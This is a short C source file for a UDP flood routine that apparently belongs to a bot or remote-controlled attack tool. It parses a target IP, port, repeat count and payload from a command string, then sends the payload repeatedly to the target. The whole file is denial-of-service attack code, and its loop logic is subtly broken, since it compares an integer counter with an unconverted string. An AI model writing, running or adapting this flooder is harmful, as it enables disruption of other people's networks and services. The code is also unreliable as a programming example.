//	format	//
/* udpflood target port times data */

#include "net_hdr.h"
#include "std_hdr.h"
extern char arg1[50],arg2[50],arg3[50],arg4[50],arg5[1024];
extern char buffer[1024];
extern int tsockfd;
struct sockaddr_in Tserv_addr;
extern socklen_t targ_len;


void udpflood()
{
	int i=0;
	sscanf(buffer,"%*s %s %s %s %s",arg2,arg3,arg4,arg5);
	tsockfd = socket(AF_INET, SOCK_DGRAM, 0);
	bzero((char *) &Tserv_addr, sizeof(Tserv_addr));
	Tserv_addr.sin_family = AF_INET;
	Tserv_addr.sin_addr.s_addr = inet_addr(arg2);
	Tserv_addr.sin_port = htons(atoi(arg3));
	if (connect(tsockfd,(struct sockaddr *) &Tserv_addr,targ_len) == 0)
		{
			while (i != arg4)
				{
					send(tsockfd,arg5,strlen(arg5),0);
					i++;
				}
			i=0;
		}
	close(tsockfd);
}
